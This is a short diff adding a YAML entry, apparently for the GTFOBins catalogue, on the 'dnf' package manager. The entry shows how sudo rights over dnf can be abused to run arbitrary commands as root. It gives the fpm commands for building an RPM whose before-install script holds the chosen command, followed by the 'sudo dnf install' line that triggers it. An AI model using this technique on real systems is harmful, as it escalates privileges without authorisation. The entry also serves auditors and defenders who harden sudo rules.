@@ -1,0 +1,15 @@
+---
+functions:
+  command:
+  - code: |-
+      sudo dnf install -y x-1.0-1.noarch.rpm
+    comment: |-
+      It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+
+      ```
+      echo /path/to/command >x.sh
+      fpm -n x -s dir -t rpm -a all --before-install x.sh .
+      ```
+    contexts:
+      sudo:
+...
